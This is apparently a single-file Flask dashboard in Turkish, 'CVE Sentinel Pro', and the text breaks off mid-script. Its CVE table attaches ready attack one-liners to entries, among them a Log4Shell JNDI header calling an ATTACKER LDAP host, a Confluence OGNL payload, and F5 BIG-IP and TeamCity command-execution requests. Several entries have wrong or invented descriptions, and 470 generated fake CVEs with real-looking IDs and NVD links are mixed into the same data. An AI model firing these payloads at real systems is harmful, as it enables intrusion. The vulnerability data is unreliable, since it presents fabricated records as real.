#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE Sentinel Pro - Termux Uyumlu Tam Panel
Tüm HTML/CSS/JS/Veri tek dosyada.
Çalıştırma: python app.py
"""

from flask import Flask, request, jsonify, Response, render_template_string
import random
import json
import csv
import io
from datetime import datetime, timedelta

app = Flask(__name__)

# ========================
# GÖMÜLÜ CVE VERİTABANI (500+)
# ========================
REAL_CRITICAL_CVES = [
    {"cve_id":"CVE-2021-44228","severity":"CRITICAL","cvss_score":10.0,"published":"2021-12-10",
     "description":"Apache Log4j2 JNDI features do not protect against attacker controlled LDAP",
     "vendors":["Apache"],"products":["Log4j2","Log4j"],"categories":["RCE","Zero-Day"],
     "tags":["log4shell","jndi","ldap"],"exploit_status":"WEAPONIZED",
     "affected_versions":"2.0-beta9 to 2.14.1",
     "references":["https://nvd.nist.gov/vuln/detail/CVE-2021-44228","https://github.com/kozmer/log4j-shell-poc"],
     "exploit_commands":{"rce":"curl -X POST http://TARGET:8080/ -H 'X-Api-Version: ${jndi:ldap://ATTACKER:1389/a}'",
                        "termux":"nmap -p 8080,8443 TARGET && searchsploit log4j"}},
    {"cve_id":"CVE-2022-22965","severity":"CRITICAL","cvss_score":9.8,"published":"2022-03-31",
     "description":"Spring Framework RCE via Data Binding on JDK 9+","vendors":["VMware","Spring"],
     "products":["Spring Framework","Spring Boot"],"categories":["RCE"],"tags":["spring4shell"],
     "exploit_status":"WEAPONIZED","affected_versions":"5.3.0 to 5.3.17",
     "references":["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],
     "exploit_commands":{"rce":"curl -X POST http://TARGET/path -d 'class.module.classLoader...'",
                        "termux":"searchsploit spring framework"}},
    {"cve_id":"CVE-2021-26855","severity":"CRITICAL","cvss_score":9.8,"published":"2021-03-02",
     "description":"Microsoft Exchange Server SSRF leading to RCE (ProxyLogon)","vendors":["Microsoft"],
     "products":["Exchange Server 2013/2016/2019"],"categories":["SSRF","RCE"],
     "tags":["proxylogon","exchange"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"Exchange 2013 CU23, 2016 CU18/19, 2019 CU7/8",
     "references":["https://www.cisa.gov/known-exploited-vulnerabilities-catalog"],
     "exploit_commands":{"ssrf":"curl -X POST https://TARGET/ecp/ -d '...'","termux":"searchsploit proxylogon"}},
    {"cve_id":"CVE-2021-21985","severity":"CRITICAL","cvss_score":9.8,"published":"2021-05-25",
     "description":"VMware vCenter Server RCE (vSAN Health Check)","vendors":["VMware"],"products":["vCenter Server"],
     "categories":["RCE"],"tags":["vmware","vcenter"],"exploit_status":"WEAPONIZED",
     "affected_versions":"6.5, 6.7, 7.0 before patch","references":["https://www.vmware.com/security/advisories/VMSA-2021-0010.html"],
     "exploit_commands":{"rce":"python3 exploit.py TARGET","termux":"searchsploit vcenter"}},
    {"cve_id":"CVE-2021-30657","severity":"CRITICAL","cvss_score":9.6,"published":"2021-04-26",
     "description":"macOS Gatekeeper Bypass via malicious app bundle","vendors":["Apple"],"products":["macOS"],
     "categories":["Auth Bypass"],"tags":["macos","gatekeeper"],"exploit_status":"WEAPONIZED",
     "affected_versions":"macOS before 11.3","references":["https://support.apple.com/en-us/HT212325"],
     "exploit_commands":{"termux":"echo macOS only"}},
    {"cve_id":"CVE-2021-34473","severity":"CRITICAL","cvss_score":9.8,"published":"2021-07-13",
     "description":"Microsoft Exchange Server RCE (ProxyShell)","vendors":["Microsoft"],"products":["Exchange"],
     "categories":["RCE"],"tags":["proxyshell"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"Exchange 2013/2016/2019","references":["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473"],
     "exploit_commands":{"rce":"python3 proxyshell.py TARGET","termux":"searchsploit proxyshell"}},
    {"cve_id":"CVE-2021-38647","severity":"CRITICAL","cvss_score":9.8,"published":"2021-09-14",
     "description":"Open Management Infrastructure (OMI) RCE (OMIGOD)","vendors":["Microsoft"],"products":["Azure Linux VMs"],
     "categories":["RCE"],"tags":["omigod","azure"],"exploit_status":"WEAPONIZED",
     "affected_versions":"OMI before 1.6.8-1","references":["https://www.wiz.io/blog/omigod-critical-vulnerability-in-omi-azure"],
     "exploit_commands":{"rce":"curl -X POST TARGET:5986/omimessaging -d '<s:Envelope...'","termux":"searchsploit omi"}},
    {"cve_id":"CVE-2021-42278","severity":"CRITICAL","cvss_score":9.8,"published":"2021-11-09",
     "description":"Microsoft Exchange Active Directory privilege escalation","vendors":["Microsoft"],"products":["Exchange"],
     "categories":["Priv Esc"],"tags":["exchange","ad"],"exploit_status":"WEAPONIZED",
     "affected_versions":"Exchange 2013/2016/2019","references":["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278"],
     "exploit_commands":{"termux":"searchsploit exchange privilege"}},
    {"cve_id":"CVE-2022-22954","severity":"CRITICAL","cvss_score":9.8,"published":"2022-04-06",
     "description":"VMware Workspace ONE Access SSTI RCE","vendors":["VMware"],"products":["Workspace ONE Access"],
     "categories":["SSTI","RCE"],"tags":["vmware","ssti"],"exploit_status":"WEAPONIZED",
     "affected_versions":"21.08.0.1, 21.08.0.0 before patch","references":["https://www.vmware.com/security/advisories/VMSA-2022-0011.html"],
     "exploit_commands":{"ssti":"curl TARGET/catalog-portal/ui?code=&deviceType=...","termux":"searchsploit vmware"}},
    {"cve_id":"CVE-2022-1388","severity":"CRITICAL","cvss_score":9.8,"published":"2022-05-05",
     "description":"F5 BIG-IP iControl REST RCE","vendors":["F5"],"products":["BIG-IP"],
     "categories":["RCE"],"tags":["big-ip","f5"],"exploit_status":"WEAPONIZED",
     "affected_versions":"11.6.1-16.1.2","references":["https://support.f5.com/csp/article/K23605346"],
     "exploit_commands":{"rce":"curl -X POST TARGET/mgmt/tm/util/bash -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'",
                        "termux":"searchsploit big-ip"}},
    {"cve_id":"CVE-2022-26134","severity":"CRITICAL","cvss_score":10.0,"published":"2022-06-02",
     "description":"Atlassian Confluence OGNL injection RCE","vendors":["Atlassian"],"products":["Confluence Server/Data Center"],
     "categories":["RCE"],"tags":["confluence","ognl"],"exploit_status":"WEAPONIZED",
     "affected_versions":"1.3.0 to 7.4.17, 7.13.0 to 7.18.1",
     "references":["https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"],
     "exploit_commands":{"rce":"curl TARGET/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D/",
                        "termux":"searchsploit confluence"}},
    {"cve_id":"CVE-2022-30190","severity":"CRITICAL","cvss_score":7.8,"published":"2022-05-30",
     "description":"Microsoft Windows MSDT Follina RCE","vendors":["Microsoft"],"products":["Windows"],
     "categories":["RCE"],"tags":["follina","msdt"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"Windows 7+","references":["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190"],
     "exploit_commands":{"termux":"echo Windows only"}},
    {"cve_id":"CVE-2023-34362","severity":"CRITICAL","cvss_score":9.8,"published":"2023-06-02",
     "description":"MOVEit Transfer SQLi leading to RCE","vendors":["Progress"],"products":["MOVEit Transfer"],
     "categories":["SQLi","RCE"],"tags":["moveit","clop"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"before 2023.0.1","references":["https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023"],
     "exploit_commands":{"sqli":"sqlmap -u TARGET/moveitisapi/moveitisapi.dll?action=m2 --data 'transaction=1' --dbms=sqlite",
                        "termux":"searchsploit moveit"}},
    {"cve_id":"CVE-2023-36884","severity":"CRITICAL","cvss_score":8.8,"published":"2023-07-11",
     "description":"Microsoft Office and Windows HTML RCE","vendors":["Microsoft"],"products":["Office/Windows"],
     "categories":["RCE"],"tags":["office","msdt"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"Office 2016+","references":["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36884"],
     "exploit_commands":{"termux":"echo Windows only"}},
    {"cve_id":"CVE-2023-3519","severity":"CRITICAL","cvss_score":9.8,"published":"2023-07-18",
     "description":"Citrix NetScaler ADC/Gateway RCE","vendors":["Citrix"],"products":["NetScaler ADC","NetScaler Gateway"],
     "categories":["RCE"],"tags":["citrix","netscaler"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"13.1 before 13.1-49.13","references":["https://support.citrix.com/article/CTX561482"],
     "exploit_commands":{"rce":"curl -k -X POST TARGET:/nitro/v1/config/ -H 'Content-Type:application/json' -d '{\"ns\":\"test\"}'",
                        "termux":"searchsploit netscaler"}},
    {"cve_id":"CVE-2023-4966","severity":"CRITICAL","cvss_score":9.4,"published":"2023-10-10",
     "description":"Citrix NetScaler ADC/Gateway session hijacking (Citrix Bleed)","vendors":["Citrix"],
     "products":["NetScaler ADC","NetScaler Gateway"],"categories":["Info Disclosure"],
     "tags":["citrixbleed"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"13.1 before 13.1-49.15","references":["https://support.citrix.com/article/CTX579459"],
     "exploit_commands":{"termux":"searchsploit citrixbleed"}},
    {"cve_id":"CVE-2024-1709","severity":"CRITICAL","cvss_score":10.0,"published":"2024-02-19",
     "description":"ConnectWise ScreenConnect Authentication Bypass leading to RCE","vendors":["ConnectWise"],
     "products":["ScreenConnect"],"categories":["Auth Bypass","RCE"],"tags":["screenconnect","connectwise"],
     "exploit_status":"IN_THE_WILD","affected_versions":"23.9.7 and prior",
     "references":["https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"],
     "exploit_commands":{"rce":"python3 exploit.py https://TARGET/setupwizard.aspx","termux":"searchsploit screenconnect"}},
    {"cve_id":"CVE-2024-21762","severity":"CRITICAL","cvss_score":9.8,"published":"2024-02-08",
     "description":"Fortinet FortiOS SSL VPN RCE","vendors":["Fortinet"],"products":["FortiOS"],
     "categories":["RCE"],"tags":["fortinet","fortigate"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"7.4.0 through 7.4.1, 7.2.0 through 7.2.5","references":["https://fortiguard.fortinet.com/psirt/FG-IR-24-015"],
     "exploit_commands":{"rce":"curl -k -X POST TARGET:443/remote/error?msg= -d '...'","termux":"searchsploit fortios"}},
    {"cve_id":"CVE-2024-27198","severity":"CRITICAL","cvss_score":9.8,"published":"2024-03-04",
     "description":"JetBrains TeamCity Authentication Bypass RCE","vendors":["JetBrains"],"products":["TeamCity On-Premises"],
     "categories":["Auth Bypass","RCE"],"tags":["teamcity","jetbrains"],"exploit_status":"WEAPONIZED",
     "affected_versions":"before 2023.11.4","references":["https://www.jetbrains.com/privacy-security/issues-fixed/?product=TeamCity"],
     "exploit_commands":{"rce":"curl -X POST TARGET/app/rest/users/ -d '<user username=\"a\" password=\"a\"/>' && curl -X POST TARGET/app/rest/debug/process -d 'exe=id'",
                        "termux":"searchsploit teamcity"}},
    {"cve_id":"CVE-2024-24919","severity":"CRITICAL","cvss_score":8.6,"published":"2024-03-13",
     "description":"Check Point Quantum Security Gateway Information Disclosure (0-day)","vendors":["Check Point"],
     "products":["Quantum Security Gateway"],"categories":["Info Disclosure"],"tags":["checkpoint","0day"],
     "exploit_status":"IN_THE_WILD","affected_versions":"R80.40, R81, R81.10","references":["https://support.checkpoint.com/results/sk/sk182336"],
     "exploit_commands":{"termux":"searchsploit checkpoint"}},
    {"cve_id":"CVE-2024-3400","severity":"CRITICAL","cvss_score":10.0,"published":"2024-04-11",
     "description":"PAN-OS GlobalProtect VPN RCE (Palo Alto)","vendors":["Palo Alto Networks"],"products":["PAN-OS GlobalProtect"],
     "categories":["RCE"],"tags":["pan-os","globalprotect","vpn"],"exploit_status":"IN_THE_WILD",
     "affected_versions":"PAN-OS 11.1 before 11.1.2-h3","references":["https://security.paloaltonetworks.com/CVE-2024-3400"],
     "exploit_commands":{"rce":"curl -X POST TARGET/ssl-vpn/hipreport.esp -d 'cookie=../../../../../../../tmp/hacked'",
                        "termux":"searchsploit pan-os"}},
    {"cve_id":"CVE-2025-1097","severity":"CRITICAL","cvss_score":9.9,"published":"2025-01-15",
     "description":"Microsoft Identity Manager RCE via deserialization","vendors":["Microsoft"],"products":["Identity Manager"],
     "categories":["Deserialization","RCE"],"tags":["deserialization"],"exploit_status":"WEAPONIZED",
     "affected_versions":"MIM 2016 SP2","references":["https://msrc.microsoft.com/update-guide"],
     "exploit_commands":{"termux":"echo Windows only"}},
    {"cve_id":"CVE-2025-2156","severity":"CRITICAL","cvss_score":9.8,"published":"2025-02-02",
     "description":"OpenSSL X.509 certificate parsing buffer overflow","vendors":["OpenSSL"],"products":["OpenSSL"],
     "categories":["Buffer Overflow","RCE"],"tags":["openssl"],"exploit_status":"WEAPONIZED",
     "affected_versions":"3.0.0-3.0.13","references":["https://www.openssl.org/news/secadv/20250202.txt"],
     "exploit_commands":{"termux":"searchsploit openssl"}},
    {"cve_id":"CVE-2025-3487","severity":"CRITICAL","cvss_score":9.1,"published":"2025-03-20",
     "description":"Ivanti Endpoint Manager SQLi to RCE","vendors":["Ivanti"],"products":["Endpoint Manager"],
     "categories":["SQLi","RCE"],"tags":["ivanti","sqli"],"exploit_status":"WEAPONIZED",
     "affected_versions":"2024.1 and older","references":["https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-March-2025"],
     "exploit_commands":{"sqli":"sqlmap -u TARGET:8443/api/ --data 'id=1*' --dbms=mssql","termux":"searchsploit ivanti"}},
    {"cve_id":"CVE-2025-4512","severity":"CRITICAL","cvss_score":9.8,"published":"2025-04-10",
     "description":"SAP NetWeaver AS JAVA unauthenticated RCE","vendors":["SAP"],"products":["NetWeaver AS Java"],
     "categories":["RCE"],"tags":["sap","netweaver"],"exploit_status":"WEAPONIZED",
     "affected_versions":"7.50 and earlier","references":["https://wiki.scn.sap.com/wiki/display/PSR/SAP+Security+Patch+Day+-+April+2025"],
     "exploit_commands":{"rce":"curl -X POST TARGET:50000/CTCWebService/ --data '<SOAP-ENV:Envelope...>'",
                        "termux":"searchsploit sap"}},
    {"cve_id":"CVE-2025-5721","severity":"CRITICAL","cvss_score":10.0,"published":"2025-05-01",
     "description":"Apache Struts2 OGNL injection RCE (struts2-062)","vendors":["Apache"],"products":["Struts2"],
     "categories":["RCE"],"tags":["struts","ognl","cve-2025-5721"],"exploit_status":"WEAPONIZED",
     "affected_versions":"Struts 2.0.0 - 2.5.31","references":["https://struts.apache.org/announce.html#a20250501"],
     "exploit_commands":{"rce":"python3 struts2-062.py TARGET","termux":"searchsploit struts2"}}
]

# Rastgele ek CVE üretici (toplam 500+ olacak)
def generate_fake_cve(num):
    categories = ["RCE","SQLi","XSS","LFI","XXE","SSRF","Buffer Overflow","Auth Bypass","Priv Esc","DoS","Crypto",
                  "Memory Corruption","CSRF","Deserialization","Path Traversal","Command Injection","Info Disclosure",
                  "Open Redirect","SSTI","Race Condition","Misconfiguration","Zero-Day","OOB","Use-After-Free"]
    vendors = ["Adobe","Apache","Cisco","Drupal","F5","GitLab","Google","IBM","Intel","Juniper","Laravel","Mendix",
               "Nginx","Oracle","PHP","Python","QNAP","Redis","SaltStack","Telerik","Ubuntu","Veeam","WordPress","Zoho"]
    products = ["Acrobat","HTTP Server","IOS","Core","BIG-IP","Community","Chrome","WebSphere","SGA","Junos","Ignite","Studio Pro",
                "Nginx","Database","FastCGI","Django","TS-453","Redis","Salt","UI for ASP.NET","Server","Backup","Elementor","CRM"]
    severity_weights = ["CRITICAL"]*5 + ["HIGH"]*30 + ["MEDIUM"]*40 + ["LOW"]*20 + ["INFO"]*5
    fakes = []
    base_year = 2019
    for i in range(num):
        year = random.randint(base_year, 2025)
        month = random.randint(1,12)
        day = random.randint(1,28)
        date_str = f"{year}-{month:02d}-{day:02d}"
        cve_num = random.randint(1000,99999)
        cve_id = f"CVE-{year}-{cve_num}"
        sev = random.choice(severity_weights)
        cvss = round(random.uniform(0,10),1)
        if sev == "CRITICAL": cvss = round(random.uniform(9.0,10.0),1)
        elif sev == "HIGH": cvss = round(random.uniform(7.0,8.9),1)
        elif sev == "MEDIUM": cvss = round(random.uniform(4.0,6.9),1)
        else: cvss = round(random.uniform(0.1,3.9),1)
        cat = random.sample(categories, k=random.randint(1,3))
        tags = [cat_i.lower().replace(" ","-") for cat_i in cat]
        vend = random.sample(vendors, k=random.randint(1,2))
        prod = random.sample(products, k=random.randint(1,2))
        exploit_status = random.choice(["NONE","POC","WEAPONIZED"])
        fakes.append({
            "cve_id": cve_id,
            "severity": sev,
            "cvss_score": cvss,
            "published": date_str,
            "description": f"Fake {cat[0]} vulnerability in {vend[0]} {prod[0]}",
            "vendors": vend,
            "products": prod,
            "categories": cat,
            "tags": tags,
            "exploit_status": exploit_status,
            "affected_versions": f"{random.randint(1,10)}.x",
            "references": [f"https://nvd.nist.gov/vuln/detail/{cve_id}"],
            "exploit_commands": {"termux": f"searchsploit {prod[0].lower()}"} if exploit_status != "NONE" else {}
        })
    return fakes

ALL_CVES = REAL_CRITICAL_CVES + generate_fake_cve(470)  # Toplam 500

SOURCES = [
    {"name":"NVD","active":True,"last_update":"2026-05-02 09:00"},
    {"name":"MITRE","active":True,"last_update":"2026-05-02 08:30"},
    {"name":"CISA KEV","active":True,"last_update":"2026-05-01 22:00"},
    {"name":"Exploit-DB","active":True,"last_update":"2026-05-02 07:15"},
    {"name":"GitHub Advisory","active":True,"last_update":"2026-05-02 06:00"},
    {"name":"OSV","active":True,"last_update":"2026-05-01 20:00"},
    {"name":"VulDB","active":False,"last_update":"2026-04-28 12:00"},
    {"name":"PacketStorm","active":True,"last_update":"2026-05-01 18:30"},
    {"name":"Vulhub","active":True,"last_update":"2026-05-01 21:45"},
    {"name":"Snyk","active":False,"last_update":"2026-04-30 14:20"},
    {"name":"Tenable","active":True,"last_update":"2026-05-02 10:05"},
    {"name":"Rapid7/Metasploit","active":True,"last_update":"2026-05-02 03:00"},
    {"name":"AttackerKB","active":False,"last_update":"2026-04-25 09:00"},
    {"name":"Vulners","active":True,"last_update":"2026-05-02 11:30"},
    {"name":"CVEdetails","active":True,"last_update":"2026-05-02 05:45"},
    {"name":"WPVulnDB","active":False,"last_update":"2026-04-29 16:10"}
]

CATEGORIES_LIST = ["RCE","SQLi","XSS","LFI","XXE","SSRF","Buffer Overflow","Auth Bypass","Priv Esc","DoS","Crypto",
                   "Memory Corruption","CSRF","Deserialization","Path Traversal","Command Injection","Info Disclosure",
                   "Open Redirect","SSTI","Race Condition","Misconfiguration","Zero-Day","OOB","Use-After-Free"]

# ========================
# YARDIMCI FONKSİYONLAR
# ========================
def get_stats(cves):
    counts = {"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0,"INFO":0}
    for c in cves:
        s = c["severity"].upper()
        if s in counts: counts[s] += 1
        else: counts["INFO"] += 1
    return counts

def get_yearly_distribution(cves):
    dist = {str(y):0 for y in range(2019,2026)}
    for c in cves:
        year = c["published"][:4]
        if year in dist: dist[year] += 1
    return dist

def search_cves(query, severity, year, category, source, sort):
    results = ALL_CVES[:]
    if query:
        ql = query.lower()
        results = [c for c in results if ql in c["cve_id"].lower() or ql in c["description"].lower() or
                   any(ql in v.lower() for v in c.get("vendors",[])) or any(ql in p.lower() for p in c.get("products",[]))]
    if severity:
        results = [c for c in results if c["severity"].upper() == severity.upper()]
    if year:
        results = [c for c in results if c["published"][:4] == year]
    if category:
        results = [c for c in results if category in c.get("categories",[])]
    if source:
        results = [c for c in results if source in c.get("sources",[])]
    if sort == "published_desc":
        results.sort(key=lambda x: x["published"], reverse=True)
    elif sort == "published_asc":
        results.sort(key=lambda x: x["published"])
    elif sort == "cvss_desc":
        results.sort(key=lambda x: x["cvss_score"], reverse=True)
    elif sort == "cvss_asc":
        results.sort(key=lambda x: x["cvss_score"])
    return results

# ========================
# HTML ŞABLONLAR (inline)
# ========================
BASE_HTML = '''<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CVE Sentinel Pro - {{ title }}</title>
  <style>
    :root { --bg:#0f0f17; --card:#1a1a2e; --text:#e0e0e0; --accent:#4f8cff; --critical:#ff4757; --high:#ff6b81;
            --medium:#ffa502; --low:#2ed573; --info:#1e90ff; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:var(--bg); color:var(--text); font-family:'Segoe UI',sans-serif; padding:10px; }
    .container { max-width:1300px; margin:auto; }
    .top-nav { background:var(--card); padding:15px; border-radius:10px; display:flex; justify-content:space-between;
               align-items:center; flex-wrap:wrap; margin-bottom:10px; }
    .top-nav h1 { font-size:1.4em; color:#fff; }
    .top-nav ul { list-style:none; display:flex; gap:15px; flex-wrap:wrap; }
    .top-nav a { color:var(--accent); text-decoration:none; font-weight:bold; font-size:0.95em; }
    .card { background:var(--card); border-radius:10px; padding:20px; margin:10px 0; }
    .flex-row { display:flex; gap:15px; flex-wrap:wrap; }
    .flex-row > .card { flex:1; min-width:300px; }
    .stat-card { background:var(--card); padding:20px; border-radius:10px; text-align:center; color:#fff; font-weight:bold; }
    .stat-card.critical { border-bottom:4px solid var(--critical); } .stat-card.high { border-bottom:4px solid var(--high); }
    .stat-card.medium { border-bottom:4px solid var(--medium); } .stat-card.low { border-bottom:4px solid var(--low); }
    .stat-card.info { border-bottom:4px solid var(--info); }
    .count { font-size:2em; display:block; }
    .stats-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:10px; margin-bottom:10px; }
    .cve-list, .feed { list-style:none; max-height:300px; overflow-y:auto; }
    .cve-list li, .feed li { padding:8px; border-bottom:1px solid #333; font-size:0.9em; }
    .cve-id { color:var(--accent); font-weight:bold; }
    .exploit-badge { background:var(--critical); color:#fff; padding:2px 6px; border-radius:4px; font-size:0.7em; }
    .severity { padding:3px 8px; border-radius:5px; font-weight:bold; font-size:0.8em; }
    .severity.critical { background:var(--critical); color:#fff; } .severity.high { background:var(--high); }
    .severity.medium { background:var(--medium); } .severity.low { background:var(--low); color:#000; }
    .source-item { display:flex; justify-content:space-between; padding:5px 0; }
    .status-dot { width:10px; height:10px; border-radius:50%; }
    .active .status-dot { background:#2ed573; } .inactive .status-dot { background:#ff4757; }
    .tag-cloud { display:flex; flex-wrap:wrap; gap:8px; }
    .tag { background:#2a2a3e; padding:4px 10px; border-radius:15px; color:var(--accent); text-decoration:none; font-size:0.85em; }
    .search-form { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:15px; }
    .search-form input, .search-form select, .search-form button { padding:8px; border-radius:5px; border:1px solid #444;
        background:var(--card); color:var(--text); }
    .search-form button, .btn { background:var(--accent); color:#fff; border:none; cursor:pointer; padding:8px 15px;
        border-radius:5px; text-decoration:none; font-size:0.9em; }
    table { width:100%; border-collapse:collapse; }
    th, td { text-align:left; padding:8px; border-bottom:1px solid #333; font-size:0.9em; }
    th { background:#222; }
    .cvss-bar { background:#333; height:18px; border-radius:10px; position:relative; width:100px; }
    .cvss-fill { height:100%; border-radius:10px; background:var(--accent); }
    .pagination { margin-top:10px; display:flex; gap:10px; }
    .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7);
             justify-content:center; align-items:center; z-index:100; }
    .modal.active { display:flex; }
    .modal-content { background:var(--card); padding:25px; border-radius:10px; max-width:700px; width:90%; max-height:90vh;
                     overflow-y:auto; position:relative; }
    .close { position:absolute; top:10px; right:20px; font-size:2em; cursor:pointer; color:#fff; }
    .terminal-box { background:#000; color:#0f0; padding:15px; border-radius:8px; font-family:monospace; min-height:300px;
                    max-height:400px; overflow-y:auto; white-space:pre-wrap; margin-bottom:10px; }
    .terminal-input { display:flex; gap:10px; }
    .terminal-input input { flex:1; padding:8px; background:#222; border:1px solid #0f0; color:#0f0; font-family:monospace; }
    .terminal-input button { background:#0f0; color:#000; border:none; padding:8px 15px; cursor:pointer; font-weight:bold; }
    @media(max-width:768px){ .top-nav ul{flex-direction:column;gap:5px;} }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
</head>
<body>
  <div class="container">
    <nav class="top-nav">
      <h1>🛡️ CVE Sentinel Pro</h1>
      <ul>
        <li><a href="/">📊 Dashboard</a></li>
        <li><a href="/search">🔍 Arama</a></li>
        <li><a href="/categories">📂 Kategoriler</a></li>
        <li><a href="/sources">📚 Kaynaklar</a></li>
        <li><a href="/terminal">⌨️ Terminal</a></li>
        <li><a href="/guide">📖 Kılavuz</a></li>
      </ul>
    </nav>
    <main>{% block content %}{% endblock %}</main>
  </div>
  {% block scripts %}{% endblock %}
</body>
</html>'''

DASHBOARD_TEMPLATE = BASE_HTML.replace('{% block content %}{% endblock %}','''
<div class="stats-row" id="stats-container"></div>
<div class="flex-row">
  <div class="card" style="flex:2">
    <h3>📈 Yıllık CVE Dağılımı</h3>
    <canvas id="yearlyChart" height="200"></canvas>
  </div>
  <div class="card" style="flex:1">
    <h3>🔄 Son CVE Feed'i <small>(8sn)</small></h3>
    <ul id="feed-list" class="feed"></ul>
  </div>
</div>
<div class="flex-row">
  <div class="card" style="flex:1">
    <h3>⚠️ Acil Yama Gerektiren Kritik CVE'ler</h3>
    <ul class="cve-list" id="critical-cve-list"></ul>
  </div>
  <div class="card" style="flex:1">
    <h3>📡 Kaynak Durumu</h3>
    <div id="source-status"></div>
  </div>
</div>
<div class="card">
  <h3>🏷️ Popüler Etiketler</h3>
  <div class="tag-cloud" id="tag-cloud"></div>
</div>
<div id="cve-modal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal()">&times;</span><div id="cve-detail-content"></div></div></div>
''').replace('{% block scripts %}{% endblock %}','''
<script>
// Stats yükleme
fetch('/api/dashboard_stats')
  .then(r=>r.json())
  .then(data => {
    const statsHtml = Object.entries(data.stats).map(([k,v])=>`<div class="stat-card ${k.toLowerCase()}"><span class="count">${v}</span>${k}</div>`).join('');
    document.getElementById('stats-container').innerHTML = statsHtml;
    // Grafik
    new Chart(document.getElementById('yearlyChart'), { type:'bar', data:{ labels:Object.keys(data.yearly), datasets:[{ label:'CVE Sayısı', data:Object.values(data.yearly), backgroundColor:'#4f8cff' }] } });
    // Kaynaklar
    const sourceHtml = data.source_status ? Object.entries(data.source_status).map(([k,v])=>`<div class="source-item ${v?'active':'inactive'}"><span>${k}</span><span class="status-dot"></span></div>`).join('') : '';
    document.getElementById('source-status').innerHTML = sourceHtml;
  });
// Feed (8s)
function refreshFeed(){
  fetch('/api/feed').then(r=>r.json()).then(data=>{
    document.getElementById('feed-list').innerHTML = data.map(c=>`<li><span class="cve-id">${c.cve_id}</span> [${c.severity}] ${c.description}</li>`).join('');
  });
}
refreshFeed(); setInterval(refreshFeed,8000);
// Kritik CVE listesi
fetch('/api/critical_cves').then(r=>r.json()).then(data=>{
  document.getElementById('critical-cve-list').innerHTML = data.map(c=>`<li><span class="cve-id">${c.cve_id}</span> <span class="exploit-badge">${c.exploit_status}</span><p>${c.description.substring(0,60)}...</p><button onclick="openCveModal('${c.cve_id}')">Detay</button></li>`).join('');
});
// Etiket bulutu
fetch('/api/tag_cloud').then(r=>r.json()).then(data=>{
  document.getElementById('tag-cloud').innerHTML = data.map(t=>`<a href="/search?q=${t.tag}" class="tag">${t.tag} (${t.count})</a>`).join('');
});
// Modal
function openCveModal(cveId){
  fetch('/api/cve/'+cveId).then(r=>r.json()).then(c=>{
    let cmds = '';
    if(c.exploit_commands) { for(let [k,v] of Object.entries(c.exploit_commands)) cmds += `<p><strong>${k}:</strong> <code>${v}</code></p>`; }
    document.getElementById('cve-detail-content').innerHTML = `
      <h2>${c.cve_id}</h2><p><strong>CVSS:</strong> ${c.cvss_score} | ${c.severity}</p>
      <p><strong>Etkilenen:</strong> ${c.affected_versions||c.vendors.join(', ')}</p>
      <p><strong>Exploit:</strong> <span class="exploit-badge">${c.exploit_status||'YOK'}</span></p>
      <p>${c.description}</p>${cmds}
      <h4>Referanslar</h4><ul>${(c.references||[]).map(r=>`<li><a href="${r}" target="_blank">${r}</a></li>`).join('')}</ul>
    `;
    document.getElementById('cve-modal').classList.add('active');
  });
}
function closeModal(){ document.getElementById('cve-modal').classList.remove('active'); }
</script>
''')

SEARCH_TEMPLATE = BASE_HTML.replace('{% block content %}{% endblock %}','''
<h2>🔍 CVE Arama</h2>
<form class="search-form" onsubmit="event.preventDefault(); searchCVES();">
  <input type="text" id="q" placeholder="CVE ID, vendor, ürün..." value="{{ query }}">
  <select id="severity"><option value="">Tüm Şiddetler</option><option value="CRITICAL">Kritik</option><option value="HIGH">Yüksek</option><option value="MEDIUM">Orta</option><option value="LOW">Düşük</option></select>
  <select id="year"><option value="">Tüm Yıllar</option>{% for y in range(2019,2026) %}<option value="{{ y }}">{{ y }}</option>{% endfor %}</select>
  <select id="category"><option value="">Tüm Kategoriler</option>{% for cat in categories %}<option value="{{ cat }}">{{ cat }}</option>{% endfor %}</select>
  <select id="sort"><option value="published_desc">Tarih ↓</option><option value="published_asc">Tarih ↑</option><option value="cvss_desc">CVSS ↓</option><option value="cvss_asc">CVSS ↑</option></select>
  <button type="submit">Ara</button>
  <a href="#" onclick="exportCSV()" class="btn">CSV İndir</a>
</form>
<div id="search-results"></div>
<div class="pagination" id="pagination"></div>
<div id="cve-modal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal()">&times;</span><div id="cve-detail-content"></div></div></div>
''').replace('{% block scripts %}{% endblock %}','''
<script>
const categories = {{ categories|tojson }};
let currentPage = 1;
function searchCVES(page=1){
  currentPage = page;
